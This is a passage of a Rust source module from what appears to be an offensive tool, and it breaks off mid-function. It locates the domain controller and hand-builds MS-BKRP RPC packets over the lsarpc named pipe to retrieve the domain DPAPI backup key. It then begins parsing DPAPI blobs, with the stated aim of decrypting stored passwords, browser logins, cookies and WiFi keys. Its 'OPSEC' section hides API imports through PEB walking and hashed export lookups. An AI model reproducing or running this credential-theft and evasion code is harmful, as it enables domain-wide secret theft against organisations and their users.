//! DPAPI Domain Backup Key retrieval and secret decryption.
//!
//! Retrieves the domain DPAPI backup key from a Domain Controller using the
//! MS-BKRP (BackupKey Remote Protocol) over RPC, then uses it to decrypt
//! DPAPI-protected secrets without touching LSASS memory.
//!
//! **Protocol**: MS-BKRP on the DC's `\pipe\lsarpc` named pipe.
//! Interface UUID: `{6BFFD098-A112-3610-9833-46C3F87E345A}`.
//! Opnum 0 = `BackuprKey`.
//!
//! **Access**: Any domain-authenticated user can retrieve the backup key by
//! default — no Domain Admin privileges required.
//!
//! **Supported DPAPI blob versions**:
//! - v2: AES-256-CBC + HMAC-SHA512 (Windows Vista+)
//! - v1: 3DES-CBC + HMAC-SHA1 (legacy, not supported)
//!
//! **Constraints**: This module does NOT access LSASS memory, does NOT call
//! OpenProcess/NtReadVirtualMemory, and does NOT require elevated privileges.
//!
//! **OPSEC**: All API functions resolved at runtime via PEB walking and
//! export-table hashing (`pe_resolve`).  No IAT entries are created.

#![cfg(windows)]

use std::ffi::{OsStr, OsString};
use std::mem;
use std::os::raw::c_void;
use std::os::windows::ffi::OsStrExt;
use std::path::PathBuf;
use std::ptr;

use aes::cipher::{BlockCipherDecrypt, KeyInit};
use aes::Aes256;
use anyhow::{anyhow, bail, Context, Result};
use base64::engine::Engine;
use hmac::{Hmac, KeyInit, Mac};
use serde::{Deserialize, Serialize};
use sha2::Sha512;

use crate::win_types::GUID;
use crate::win_types::{DWORD, LPVOID};

// ── Compile-time hash constants ──────────────────────────────────────────────
//
// All DLL and API name hashes are computed at compile time using the same
// algorithm as pe_resolve::hash_str / hash_wstr.

// Wide-string DLL names for compile-time hashing (pe_resolve_macros::hash_wstr_const).
const NETAPI32_DLL_W: &[u16] = &[
    'n' as u16, 'e' as u16, 't' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16,
    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const RPCRT4_DLL_W: &[u16] = &[
    'r' as u16, 'p' as u16, 'c' as u16, 'r' as u16, 't' as u16, '4' as u16, '.' as u16, 'd' as u16,
    'l' as u16, 'l' as u16, 0,
];
const ADVAPI32_DLL_W: &[u16] = &[
    'a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16,
    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const KERNEL32_DLL_W: &[u16] = &[
    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, '3' as u16, '2' as u16,
    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];

const HASH_NETAPI32_DLL: u32 = crate::pe_resolve_macros::hash_wstr_const(NETAPI32_DLL_W);
const HASH_RPCRT4_DLL: u32 = crate::pe_resolve_macros::hash_wstr_const(RPCRT4_DLL_W);
const HASH_ADVAPI32_DLL: u32 = crate::pe_resolve_macros::hash_wstr_const(ADVAPI32_DLL_W);
const HASH_KERNEL32_DLL: u32 = crate::pe_resolve_macros::hash_wstr_const(KERNEL32_DLL_W);

const FN_DS_GET_DC_NAME_W: u32 = crate::pe_resolve_macros::hash_str_const(b"DsGetDcNameW\0");
const FN_RPC_STRING_BINDING_COMPOSE_W: u32 =
    crate::pe_resolve_macros::hash_str_const(b"RpcStringBindingComposeW\0");
const FN_RPC_BINDING_FROM_STRING_BINDING_W: u32 =
    crate::pe_resolve_macros::hash_str_const(b"RpcBindingFromStringBindingW\0");
const FN_RPC_BINDING_FREE: u32 = crate::pe_resolve_macros::hash_str_const(b"RpcBindingFree\0");
const FN_RPC_STRING_FREE_W: u32 = crate::pe_resolve_macros::hash_str_const(b"RpcStringFreeW\0");
const FN_RPC_BINDING_SET_AUTH_INFO_W: u32 =
    crate::pe_resolve_macros::hash_str_const(b"RpcBindingSetAuthInfoW\0");
const FN_RPC_EP_RESOLVE_BINDING: u32 =
    crate::pe_resolve_macros::hash_str_const(b"RpcEpResolveBinding\0");
const FN_CREATE_FILE_W: u32 = crate::pe_resolve_macros::hash_str_const(b"CreateFileW\0");
const FN_CLOSE_HANDLE: u32 = crate::pe_resolve_macros::hash_str_const(b"CloseHandle\0");
const FN_WRITE_FILE: u32 = crate::pe_resolve_macros::hash_str_const(b"WriteFile\0");
const FN_READ_FILE: u32 = crate::pe_resolve_macros::hash_str_const(b"ReadFile\0");

// CryptAcquireContextW, CryptImportKey, CryptDecrypt, CryptReleaseContext
const FN_CRYPT_ACQUIRE_CONTEXT_W: u32 =
    crate::pe_resolve_macros::hash_str_const(b"CryptAcquireContextW\0");
const FN_CRYPT_IMPORT_KEY: u32 = crate::pe_resolve_macros::hash_str_const(b"CryptImportKey\0");
const FN_CRYPT_DECRYPT: u32 = crate::pe_resolve_macros::hash_str_const(b"CryptDecrypt\0");
const FN_CRYPT_RELEASE_CONTEXT: u32 =
    crate::pe_resolve_macros::hash_str_const(b"CryptReleaseContext\0");
const FN_CRYPT_DESTROY_KEY: u32 = crate::pe_resolve_macros::hash_str_const(b"CryptDestroyKey\0");

// ── BKRP Interface UUID ──────────────────────────────────────────────────────
//
// {6BFFD098-A112-3610-9833-46C3F87E345A}
// BackupKey Remote Protocol — MS-BKRP

const BKRP_INTERFACE_UUID: &str = "6BFFD098-A112-3610-9833-46C3F87E345A";

// ── DPAPI Constants ──────────────────────────────────────────────────────────

/// DPAPI provider GUID: `DF9D8CD0-1501-11D1-8C7A-00C04FC297EB`
const DPAPI_PROVIDER_GUID: [u8; 16] = [
    0xD0, 0x8C, 0x9D, 0xDF, 0x01, 0x15, 0xD1, 0x11, 0x8C, 0x7A, 0x00, 0xC0, 0x4F, 0xC2, 0x97, 0xEB,
];

/// DPAPI blob version 2 (AES-256-CBC + HMAC-SHA512)
const DPAPI_BLOB_VERSION_V2: DWORD = 2;
/// DPAPI blob version 1 (3DES-CBC + HMAC-SHA1) — not supported
const DPAPI_BLOB_VERSION_V1: DWORD = 1;

/// HMAC-SHA512 output length
const SHA512_DIGEST_LEN: usize = 64;

// ── Windows type definitions ─────────────────────────────────────────────────

type FnDsGetDcNameW = unsafe extern "system" fn(
    *const u16,    // ComputerName
    *const u16,    // DomainName
    *const c_void, // DomainGuid
    *const u16,    // SiteName
    DWORD,         // Flags
    *mut LPVOID,   // DomainControllerInfo
) -> DWORD; // NET_API_STATUS (0 = NERR_Success)

type FnRpcStringBindingComposeW = unsafe extern "system" fn(
    *const u16,    // ObjUuid
    *const u16,    // ProtSeq
    *const u16,    // NetworkAddress
    *const u16,    // EndPoint
    *const u16,    // Options
    *mut *mut u16, // StringBinding
) -> DWORD; // RPC_STATUS

type FnRpcBindingFromStringBindingW = unsafe extern "system" fn(
    *const u16,       // StringBinding
    *mut *mut c_void, // Binding
) -> DWORD; // RPC_STATUS

type FnRpcBindingFree = unsafe extern "system" fn(
    *mut *mut c_void, // Binding
) -> DWORD; // RPC_STATUS

type FnRpcStringFreeW = unsafe extern "system" fn(
    *mut *mut u16, // String
) -> DWORD; // RPC_STATUS

type FnCreateFileW = unsafe extern "system" fn(
    *const u16,    // lpFileName
    DWORD,         // dwDesiredAccess
    DWORD,         // dwShareMode
    *const c_void, // lpSecurityAttributes
    DWORD,         // dwCreationDisposition
    DWORD,         // dwFlagsAndAttributes
    *mut c_void,   // hTemplateFile
) -> *mut c_void; // HANDLE

type FnCloseHandle = unsafe extern "system" fn(*mut c_void) -> i32; // BOOL

type FnWriteFile = unsafe extern "system" fn(
    *mut c_void,   // hFile
    *const c_void, // lpBuffer
    DWORD,         // nNumberOfBytesToWrite
    *mut DWORD,    // lpNumberOfBytesWritten
    *const c_void, // lpOverlapped
) -> i32; // BOOL

type FnReadFile = unsafe extern "system" fn(
    *mut c_void,   // hFile
    *mut c_void,   // lpBuffer
    DWORD,         // nNumberOfBytesToRead
    *mut DWORD,    // lpNumberOfBytesRead
    *const c_void, // lpOverlapped
) -> i32; // BOOL

type FnCryptAcquireContextW = unsafe extern "system" fn(
    *mut usize, // phProv
    *const u16, // szContainer
    *const u16, // szProvider
    DWORD,      // dwProvType
    DWORD,      // dwFlags
) -> i32; // BOOL

type FnCryptImportKey = unsafe extern "system" fn(
    usize,      // hProv
    *const u8,  // pbData
    DWORD,      // dwDataLen
    usize,      // hImportKey (0 = not encrypted)
    DWORD,      // dwFlags
    *mut usize, // phKey
) -> i32; // BOOL

type FnCryptDecrypt = unsafe extern "system" fn(
    usize,      // hProv
    usize,      // hKey
    DWORD,      // hHash (0 = no hash)
    DWORD,      // Final (TRUE = last block)
    *mut u8,    // pbData
    *mut DWORD, // pdwDataLen
    DWORD,      // dwBufLen
) -> i32; // BOOL

type FnCryptReleaseContext = unsafe extern "system" fn(
    usize, // hProv
    DWORD, // dwFlags
) -> i32; // BOOL

type FnCryptDestroyKey = unsafe extern "system" fn(
    usize, // hKey
) -> i32; // BOOL

// ── Helper: dynamic API resolution ───────────────────────────────────────────

#[inline(always)]
unsafe fn resolve_api<T: Copy>(dll_hash: u32, fn_hash: u32) -> Option<T> {
    let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
    let fn_addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
    Some(std::mem::transmute_copy::<usize, T>(&fn_addr))
}

/// Resolve a function from a DLL that may not be in the PEB yet.
#[inline(always)]
unsafe fn resolve_api_or_load<T: Copy>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) -> Option<T> {
    // Try PEB first.
    if let Some(base) = pe_resolve::get_module_handle_by_hash(dll_hash) {
        if let Some(addr) = pe_resolve::get_proc_address_by_hash(base, fn_hash) {
            return Some(std::mem::transmute_copy::<usize, T>(&addr));
        }
    }
    // DLL not loaded — use LoadLibraryW from kernel32.
    type FnLoadLibraryW = unsafe extern "system" fn(*const u16) -> *mut c_void;
    let load_library_w: FnLoadLibraryW = {
        let base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
        let addr =
            pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"LoadLibraryW\0"))?;
        std::mem::transmute::<_, FnLoadLibraryW>(addr)
    };
    let _hmod = load_library_w(dll_wide.as_ptr());
    let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
    let fn_addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
    Some(std::mem::transmute_copy::<usize, T>(&fn_addr))
}

// ── Wide string helpers ──────────────────────────────────────────────────────

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

// ── Output types ─────────────────────────────────────────────────────────────

/// A decrypted DPAPI secret.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DpapiSecret {
    /// Source of the secret (e.g. "Credential Store", "Chrome Login", "WiFi").
    pub source: String,
    /// Account or identifier (e.g. URL for Chrome, SSID for WiFi).
    pub identifier: String,
    /// Decrypted secret value (password, cookie value, key material).
    pub value: String,
    /// Username associated with the secret, if available.
    pub username: Option<String>,
    /// Timestamp of the secret, if available.
    pub timestamp: Option<String>,
}

/// Domain backup key information returned by the DC.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BackupKeyInfo {
    /// Domain controller hostname that provided the key.
    pub dc_hostname: String,
    /// Domain FQDN.
    pub domain: String,
    /// Backup key version (typically 2 for modern domains).
    pub key_version: u32,
    /// RSA private key blob (PVK format) as raw bytes.
    pub key_data: Vec<u8>,
    /// Key data encoded as hex for transport.
    pub key_hex: String,
}

// ── DOMAIN_CONTROLLER_INFO structure (minimal) ──────────────────────────────

#[repr(C)]
struct DomainControllerInfo {
    domain_controller_name: *mut u16,
    domain_controller_address: *mut u16,
    domain_controller_address_type: DWORD,
    domain_guid: GUID,
    domain_name: *mut u16,
    dns_forest_name: *mut u16,
    flags: DWORD,
    distinguished_name: *mut u16,
}

// ── DC Discovery ─────────────────────────────────────────────────────────────

/// Discover the domain controller for the current domain using DsGetDcNameW.
///
/// Returns the DC's fully-qualified DNS hostname.
fn discover_dc() -> Result<String> {
    let ds_get_dc_name: FnDsGetDcNameW = unsafe {
        resolve_api_or_load(
            &to_wide("netapi32.dll"),
            HASH_NETAPI32_DLL,
            FN_DS_GET_DC_NAME_W,
        )
        .ok_or_else(|| anyhow!("DsGetDcNameW resolve failed"))?
    };

    let mut dc_info: LPVOID = ptr::null_mut();
    let status = unsafe {
        ds_get_dc_name(
            ptr::null(), // ComputerName (local)
            ptr::null(), // DomainName (default domain)
            ptr::null(), // DomainGuid
            ptr::null(), // SiteName
            0,           // Flags: DS_DIRECTORY_SERVICE_REQUIRED
            &mut dc_info,
        )
    };

    if status != 0 {
        bail!("DsGetDcNameW failed with status {status}");
    }

    let info = unsafe { &*(dc_info as *const DomainControllerInfo) };

    // Read the DC hostname (wide string).
    let dc_hostname = if !info.domain_controller_name.is_null() {
        unsafe { wide_ptr_to_string(info.domain_controller_name) }.unwrap_or_else(|_| String::new())
    } else {
        String::new()
    };

    let domain = if !info.domain_name.is_null() {
        unsafe { wide_ptr_to_string(info.domain_name) }.unwrap_or_else(|_| String::new())
    } else {
        String::new()
    };

    // DC hostname from DsGetDcNameW starts with '\\' — strip it.
    let clean_hostname = dc_hostname.trim_start_matches('\\').to_string();

    // Free the DC info structure using NetApiBufferFree.
    // NetApiBufferFree is in netapi32.dll.
    type FnNetApiBufferFree = unsafe extern "system" fn(LPVOID) -> DWORD;
    let net_api_buffer_free: FnNetApiBufferFree = unsafe {
        resolve_api(
            HASH_NETAPI32_DLL,
            crate::pe_resolve_macros::hash_str_const(b"NetApiBufferFree\0"),
        )
        .ok_or_else(|| anyhow!("NetApiBufferFree resolve failed"))?
    };
    unsafe { net_api_buffer_free(dc_info) };

    if clean_hostname.is_empty() {
        bail!("DsGetDcNameW returned empty DC hostname");
    }

    tracing::info!("Discovered DC: {} (domain: {})", clean_hostname, domain);

    Ok(clean_hostname)
}

/// Convert a null-terminated wide string pointer to a Rust String.
unsafe fn wide_ptr_to_string(ptr: *const u16) -> Result<String> {
    if ptr.is_null() {
        return Ok(String::new());
    }
    let mut len = 0;
    while *ptr.add(len) != 0 {
        len += 1;
    }
    let slice = std::slice::from_raw_parts(ptr, len);
    Ok(String::from_utf16_lossy(slice))
}

// ── RPC PDU Construction ─────────────────────────────────────────────────────
//
// Construct RPC bind and request PDUs manually for the BKRP interface.
// This avoids the need for MIDL-generated stubs.

/// RPC PDU common fields (version 5).
const RPC_VERSION_MAJOR: u8 = 5;
const RPC_VERSION_MINOR: u8 = 0;

/// PDU types.
const PDU_TYPE_BIND: u8 = 11;
const PDU_TYPE_BIND_ACK: u8 = 12;
const PDU_TYPE_REQUEST: u8 = 0;
const PDU_TYPE_RESPONSE: u8 = 2;

/// NDR transfer syntax UUID: {8a885d04-1ceb-11c9-9fe8-08002b104860}
const NDR_TRANSFER_SYNTAX: [u8; 20] = [
    0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48,
    0x60, // UUID (16 bytes)
    0x02, 0x00, 0x00, 0x00, // Version 2.0
];

/// BKRP interface UUID + version tuple:
/// UUID {6BFFD098-A112-3610-9833-46C3F87E345A}, version 1.0
const BKRP_INTERFACE_UUID_BYTES: [u8; 20] = [
    0x98, 0xD0, 0xFF, 0x6B, // time_low (little-endian)
    0x12, 0xA1, // time_mid
    0x10, 0x36, // time_hi_and_version
    0x98, // clock_seq_hi_and_reserved
    0x33, // clock_seq_low
    0x46, 0xC3, 0xF8, 0x7E, 0x34, 0x5A, // node
    0x01, 0x00, 0x00, 0x00, // Version 1.0
];

/// Build an RPC bind PDU for the BKRP interface.
fn build_rpc_bind_pdu() -> Vec<u8> {
    let mut pdu = Vec::with_capacity(256);

    // ── Header ──
    pdu.push(RPC_VERSION_MAJOR); // version major
    pdu.push(RPC_VERSION_MINOR); // version minor
    pdu.push(PDU_TYPE_BIND); // PDU type = bind
    pdu.push(0x03); // flags: PFC_FIRST_FRAG | PFC_LAST_FRAG
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // data representation (little-endian, ASCII, IEEE)
    pdu.extend_from_slice(&[0u8; 2]); // frag_length (filled later)
    pdu.extend_from_slice(&[0u8; 2]); // auth_length = 0
    pdu.extend_from_slice(&1u32.to_le_bytes()); // call_id = 1

    // ── Bind body ──
    pdu.extend_from_slice(&0x0B58u16.to_le_bytes()); // max_xmit_frag = 2936
    pdu.extend_from_slice(&0x0B58u16.to_le_bytes()); // max_recv_frag = 2936
    pdu.extend_from_slice(&0u32.to_le_bytes()); // assoc_group = 0

    // Number of context items
    pdu.push(1); // num_ctx_items = 1
    pdu.push(0); // reserved
    pdu.push(0); // reserved
    pdu.push(0); // reserved

    // Context item 0: BKRP interface
    pdu.extend_from_slice(&0u16.to_le_bytes()); // context_id = 0
    pdu.push(1); // num_trans_items = 1
    pdu.push(0); // reserved

    // Interface UUID + version (20 bytes)
    pdu.extend_from_slice(&BKRP_INTERFACE_UUID_BYTES);

    // Transfer syntax (20 bytes)
    pdu.extend_from_slice(&NDR_TRANSFER_SYNTAX);

    // Fill in frag_length
    let frag_len = pdu.len() as u16;
    pdu[8..10].copy_from_slice(&frag_len.to_le_bytes());

    pdu
}

/// Build an RPC request PDU for BackuprKey (opnum 0).
fn build_rpc_request_pdu(principal: &str) -> Vec<u8> {
    let principal_wide: Vec<u16> = principal
        .encode_utf16()
        .chain(std::iter::once(0u16))
        .collect();
    let principal_count = principal_wide.len() as u32; // includes null terminator

    let stub_data_len: usize = 4 + 4 + 4 + 4 + (principal_count * 2) as usize; // referent_id + max_count + offset + actual_count + string
    let total_stub_len = stub_data_len;
    // Align to 4 bytes
    let aligned_stub_len = (total_stub_len + 3) & !3;

    let pdu_len: usize = 24 + aligned_stub_len; // common+request header + stub

    let mut pdu = Vec::with_capacity(pdu_len);

    // ── Header (24 bytes) ──
    pdu.push(RPC_VERSION_MAJOR);
    pdu.push(RPC_VERSION_MINOR);
    pdu.push(PDU_TYPE_REQUEST);
    pdu.push(0x03); // PFC_FIRST_FRAG | PFC_LAST_FRAG
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // data representation
    pdu.extend_from_slice(&(pdu_len as u16).to_le_bytes()); // frag_length
    pdu.extend_from_slice(&0u16.to_le_bytes()); // auth_length = 0
    pdu.extend_from_slice(&2u32.to_le_bytes()); // call_id = 2

    // ── Request-specific header (8 bytes) ──
    pdu.extend_from_slice(&(aligned_stub_len as u32).to_le_bytes()); // alloc_hint
    pdu.extend_from_slice(&0u16.to_le_bytes()); // context_id = 0
    pdu.push(0); // opnum low byte = 0 (BackuprKey)
    pdu.push(0); // opnum high byte = 0

    // ── Stub data ──
    // NDR encoding for [in, unique, string] wchar_t* pszPrincipalName

    // Referent ID (non-null)
    pdu.extend_from_slice(&0x00020000u32.to_le_bytes());

    // Conformant string: max_count, offset, actual_count, chars
    pdu.extend_from_slice(&principal_count.to_le_bytes()); // max_count
    pdu.extend_from_slice(&0u32.to_le_bytes()); // offset = 0
    pdu.extend_from_slice(&principal_count.to_le_bytes()); // actual_count

    // String data (UTF-16LE)
    for ch in &principal_wide {
        pdu.extend_from_slice(&ch.to_le_bytes());
    }

    // Pad to 4-byte alignment
    while pdu.len() % 4 != 0 {
        pdu.push(0);
    }

    // Update frag_length
    let frag_len = pdu.len() as u16;
    pdu[8..10].copy_from_slice(&frag_len.to_le_bytes());

    pdu
}

/// Parse an RPC bind ack PDU. Returns Ok(()) on success.
fn parse_rpc_bind_ack(data: &[u8]) -> Result<()> {
    if data.len() < 30 {
        bail!("Bind ack too short: {} bytes", data.len());
    }
    if data[0] != RPC_VERSION_MAJOR || data[1] != RPC_VERSION_MINOR {
        bail!(
            "Unexpected RPC version in bind ack: {}.{}",
            data[0],
            data[1]
        );
    }
    if data[2] != PDU_TYPE_BIND_ACK {
        bail!("Expected bind ack PDU type, got {}", data[2]);
    }

    let frag_len = u16::from_le_bytes([data[8], data[9]]) as usize;
    if frag_len < 30 || frag_len > data.len() {
        bail!(
            "Invalid bind ack fragment length: {} (buffer={})",
            frag_len,
            data.len()
        );
    }

    // bind_ack body starts immediately after the 16-byte common header:
    // max_xmit_frag(2), max_recv_frag(2), assoc_group(4), sec_addr_len(2), sec_addr(variable).
    let sec_addr_len = u16::from_le_bytes([data[24], data[25]]) as usize;
    let sec_addr_end = 26usize
        .checked_add(sec_addr_len)
        .ok_or_else(|| anyhow!("Bind ack sec_addr length overflow"))?;
    let result_list_offset = (sec_addr_end + 3) & !3;

    if result_list_offset + 4 > frag_len {
        bail!("Bind ack result list out of bounds");
    }

    let num_results = data[result_list_offset] as usize;
    if num_results == 0 {
        bail!("Bind ack contains no presentation context results");
    }

    // Presentation context result list header: n_results(1), reserved(1), reserved2(2)
    let first_result = result_list_offset + 4;
    if first_result + 24 > frag_len {
        bail!("Bind ack first context result truncated");
    }

    let result = u16::from_le_bytes([data[first_result], data[first_result + 1]]);
    if result != 0 {
        let reason = u16::from_le_bytes([data[first_result + 2], data[first_result + 3]]);
        bail!("RPC bind rejected: result={result}, reason={reason}");
    }

    Ok(())
}

/// Parse an RPC response PDU and extract the stub data.
fn parse_rpc_response(data: &[u8]) -> Result<Vec<u8>> {
    if data.len() < 28 {
        bail!("Response too short: {} bytes", data.len());
    }
    if data[0] != RPC_VERSION_MAJOR || data[1] != RPC_VERSION_MINOR {
        bail!(
            "Unexpected RPC version in response: {}.{}",
            data[0],
            data[1]
        );
    }
    if data[2] != PDU_TYPE_RESPONSE {
        // Could also be a fault PDU (type 3)
        if data[2] == 3 {
            // Fault PDU
            let status = u32::from_le_bytes([data[24], data[25], data[26], data[27]]);
            bail!("RPC fault response, status: 0x{status:08X}");
        }
        bail!("Expected response PDU type, got {}", data[2]);
    }

    let frag_len = u16::from_le_bytes([data[8], data[9]]) as usize;
    if data.len() < frag_len {
        bail!(
            "Response truncated: have {} bytes, frag_len says {}",
            data.len(),
            frag_len
        );
    }

    // Stub data starts at offset 28 (24-byte header + 4-byte response header, but
    // the actual response header includes alloc_hint(4), context_id(2), cancel_count(1), reserved(1)
    // = 8 bytes total, but DCE RPC uses offset 24 for the stub.
    // Actually: header is 16 bytes common + 8 bytes request/response specific = 24 total.
    // Stub starts at offset 24.
    let stub = data[24..frag_len].to_vec();
    Ok(stub)
}

// ── Named Pipe RPC Client ────────────────────────────────────────────────────

/// Connect to the DC's named pipe for RPC and perform the BKRP BackuprKey call.
///
/// Uses raw named pipe I/O with manually constructed RPC PDUs.
/// This approach avoids IAT entries from rpcrt4.dll imports.
fn rpc_bkrp_backup_key(dc_hostname: &str) -> Result<(u32, Vec<u8>)> {
    let create_file_w: FnCreateFileW = unsafe {
        resolve_api(HASH_KERNEL32_DLL, FN_CREATE_FILE_W)
            .ok_or_else(|| anyhow!("CreateFileW resolve failed"))?
    };
    let close_handle: FnCloseHandle = unsafe {
        resolve_api(HASH_KERNEL32_DLL, FN_CLOSE_HANDLE)
            .ok_or_else(|| anyhow!("CloseHandle resolve failed"))?
    };
    let write_file: FnWriteFile = unsafe {
        resolve_api(HASH_KERNEL32_DLL, FN_WRITE_FILE)
            .ok_or_else(|| anyhow!("WriteFile resolve failed"))?
    };
    let read_file: FnReadFile = unsafe {
        resolve_api(HASH_KERNEL32_DLL, FN_READ_FILE)
            .ok_or_else(|| anyhow!("ReadFile resolve failed"))?
    };

    // Construct named pipe path: \\DC\pipe\lsarpc
    let pipe_path = format!("\\\\{}\\pipe\\lsarpc", dc_hostname);
    let pipe_path_wide = to_wide(&pipe_path);

    // Open the named pipe with read/write access.
    let handle = unsafe {
        create_file_w(
            pipe_path_wide.as_ptr(),
            0x80000000 | 0x40000000, // GENERIC_READ | GENERIC_WRITE
            0,                       // No sharing
            ptr::null(),
            3, // OPEN_EXISTING
            0, // FILE_ATTRIBUTE_NORMAL
            ptr::null_mut(),
        )
    };

    if handle == ptr::null_mut() || handle as isize == -1 {
        bail!("Failed to open named pipe: {}", pipe_path);
    }

    // Send RPC bind PDU.
    let bind_pdu = build_rpc_bind_pdu();
    let mut bytes_written: DWORD = 0;
    let write_ok = unsafe {
        write_file(
            handle,
            bind_pdu.as_ptr() as *const c_void,
            bind_pdu.len() as DWORD,
            &mut bytes_written,
            ptr::null(),
        )
    };
    if write_ok == 0 {
        unsafe { close_handle(handle) };
        bail!(
            "WriteFile failed for bind PDU (wrote {} of {} bytes)",
            bytes_written,
            bind_pdu.len()
        );
    }

    // Read bind ack.
    let mut bind_ack_buf = vec![0u8; 4096];
    let mut bytes_read: DWORD = 0;
    let read_ok = unsafe {
        read_file(
            handle,
            bind_ack_buf.as_mut_ptr() as *mut c_void,
            bind_ack_buf.len() as DWORD,
            &mut bytes_read,
            ptr::null(),
        )
    };
    if read_ok == 0 || bytes_read == 0 {
        unsafe { close_handle(handle) };
        bail!("ReadFile failed for bind ack (read {} bytes)", bytes_read);
    }

    bind_ack_buf.truncate(bytes_read as usize);
    parse_rpc_bind_ack(&bind_ack_buf).context("RPC bind to BKRP interface failed")?;

    tracing::info!("RPC bind to BKRP interface succeeded on {}", dc_hostname);

    // Send BackuprKey request (opnum 0).
    // The principal name should be the DC's hostname or the domain name.
    let request_pdu = build_rpc_request_pdu(dc_hostname);
    let mut bytes_written: DWORD = 0;
    let write_ok = unsafe {
        write_file(
            handle,
            request_pdu.as_ptr() as *const c_void,
            request_pdu.len() as DWORD,
            &mut bytes_written,
            ptr::null(),
        )
    };
    if write_ok == 0 {
        unsafe { close_handle(handle) };
        bail!(
            "WriteFile failed for BackuprKey request (wrote {} of {} bytes)",
            bytes_written,
            request_pdu.len()
        );
    }

    // Read response (may be large — the backup key can be 2KB+).
    let mut resp_buf = vec![0u8; 8192];
    let mut total_read: DWORD = 0;
    let mut bytes_read: DWORD = 0;
    let read_ok = unsafe {
        read_file(
            handle,
            resp_buf.as_mut_ptr() as *mut c_void,
            resp_buf.len() as DWORD,
            &mut bytes_read,
            ptr::null(),
        )
    };

    unsafe { close_handle(handle) };

    if read_ok == 0 || bytes_read == 0 {
        bail!(
            "ReadFile failed for BackuprKey response (read {} bytes)",
            bytes_read
        );
    }

    total_read = bytes_read;
    resp_buf.truncate(total_read as usize);

    let stub_data = parse_rpc_response(&resp_buf).context("Failed to parse RPC response")?;

    // Parse the BackuprKey NDR response:
    // [out] DWORD* pdwVersion, [out] BYTE** ppbData, [out] DWORD* pcbData
    // NDR layout:
    //   pdwVersion: 4 bytes
    //   ppbData referent: 4 bytes (0 = null, non-zero = present)
    //     If non-zero: conformant array: max_count(4), data(max_count)
    //   pcbData: 4 bytes
    parse_bkrp_response(&stub_data)
}

/// Parse the NDR-encoded BackuprKey response.
fn parse_bkrp_response(stub: &[u8]) -> Result<(u32, Vec<u8>)> {
    if stub.len() < 12 {
        bail!("BackuprKey response stub too short: {} bytes", stub.len());
    }

    let mut offset = 0;

    // pdwVersion
    let version = u32::from_le_bytes([
        stub[offset],
        stub[offset + 1],
        stub[offset + 2],
        stub[offset + 3],
    ]);
    offset += 4;

    // ppbData referent ID
    let referent_id = u32::from_le_bytes([
        stub[offset],
        stub[offset + 1],
        stub[offset + 2],
        stub[offset + 3],
    ]);
    offset += 4;

    if referent_id == 0 {
        // pcbData should also indicate 0
        let cb_data = u32::from_le_bytes([
            stub[offset],
            stub[offset + 1],
            stub[offset + 2],
            stub[offset + 3],
        ]);
        bail!("BackuprKey returned null data (version={version}, cbData={cb_data})");
    }

    // Conformant array: max_count followed by data.
    if offset + 4 > stub.len() {
        bail!("BackuprKey response truncated at array max_count");
    }
    let max_count = u32::from_le_bytes([
        stub[offset],
        stub[offset + 1],
        stub[offset + 2],
        stub[offset + 3],
    ]);
    offset += 4;

    if offset + max_count as usize > stub.len() {
        bail!(
            "BackuprKey response truncated: need {} bytes at offset {}, have {}",
            max_count,
            offset,
            stub.len()
        );
    }

    let key_data = stub[offset..offset + max_count as usize].to_vec();
    offset += max_count as usize;

    // Align to 4
    offset = (offset + 3) & !3;

    // pcbData
    if offset + 4 > stub.len() {
        bail!("BackuprKey response truncated at pcbData");
    }
    let cb_data = u32::from_le_bytes([
        stub[offset],
        stub[offset + 1],
        stub[offset + 2],
        stub[offset + 3],
    ]);

    if cb_data != max_count {
        tracing::warn!(
            "BackuprKey: cbData ({}) != max_count ({})",
            cb_data,
            max_count
        );
    }

    tracing::info!(
        "Retrieved backup key: version={}, size={} bytes",
        version,
        key_data.len()
    );

    Ok((version, key_data))
}

// ── DPAPI Blob Parser ────────────────────────────────────────────────────────

/// DPAPI blob header structure.
#[derive(Debug)]
struct DpapiBlobHeader {
    /// Blob version (1 = 3DES, 2 = AES-256).
    version: u32,
    /// GUID of the cryptographic provider.
    guid_provider: [u8; 16],
    /// Master key version.
    mk_version: u32,
    /// Offset to the master key GUID.
    mk_offset: u32,
    /// Offset to the key identifier string.
    key_identifier_offset: u32,
    /// Size of the key identifier.
    key_identifier_size: u32,
    /// Offset to the HMAC key material.
    hmac_key_offset: u32,
    /// Size of the HMAC key material.
    hmac_key_size: u32,
    /// Offset to the encrypted data.
    data_offset: u32,
    /// Size of the encrypted data.
    data_size: u32,
    /// Offset to the signature (HMAC of the encrypted data).
    sign_offset: u32,
    /// Size of the signature.
    sign_size: u32,
}

impl DpapiBlobHeader {
    /// Parse a DPAPI blob header from raw bytes.
    fn parse(data: &[u8]) -> Result<Self> {
        if data.len() < 104 {
            bail!(
                "DPAPI blob too short for header: {} bytes (need 104)",
                data.len()
            );
        }

        // Verify the DPAPI provider GUID.
        let guid_provider: [u8; 16] = data[4..20].try_into().unwrap();
        if guid_provider != DPAPI_PROVIDER_GUID {
            bail!("Not a valid DPAPI blob: provider GUID mismatch");
